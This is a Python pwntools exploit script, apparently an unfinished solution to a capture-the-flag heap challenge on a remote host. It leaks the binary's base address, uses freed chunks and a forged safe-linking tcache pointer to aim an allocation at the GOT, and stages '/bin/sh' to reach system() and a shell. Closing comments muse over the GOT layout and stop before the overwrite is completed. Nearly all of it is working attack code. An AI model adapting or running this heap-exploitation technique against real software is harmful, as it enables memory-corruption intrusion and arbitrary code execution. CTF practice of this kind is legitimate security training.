from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)
register(3, 1, 16, b'/bin/sh\x00' + b'D'*8)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
system_plt = base_addr + 0x1150

delete(2)
delete(1)
delete(0)

target_addr = base_addr + 0x35f0
fd = target_addr ^ (chk1 >> 12)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(fd)

for i in range(2, 2000):
    payload = payload.ljust(i * 32 - 8, b'\x00')
    payload += p64(0x21)

payload = payload.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload)
recv_menu()

register(1, 1, 16, b'X'*16)

# Look at 0x35e0: d8330000 00000000 (dynamic info?)
# 0x35e8: 00000000 00000000 (link map?)
# 0x35f0: 00000000 00000000 (dl_runtime_resolve?)
# 0x35f8: 30100000 00000000 (free@got)
# 0x3600: 40100000 00000000 (puts@got)
# Ah! 0x35f0 contains `dl_runtime_resolve` address after lazy binding initialization!
# If we overwrite it with 0, dynamic resolution for other functions might crash!
# Since we write `p64(0) + p64(system_plt)`, we overwrite `dl_runtime_resolve` with 0!
# We don't want to crash. We can just NOT overwrite it!
# Wait! Can we read what is at 0x35f0 first?
# We have an arbitrary read! `view(idx)` will read what is at the checkpoint!
# Or we can just use the target address `0x35f8 - 8 = 0x35f0`.
# Can we use an unaligned address? No, must be aligned to 16 bytes.
# If we must use 0x35f0, and it contains `dl_runtime_resolve`, we can leak it first!
p.close()
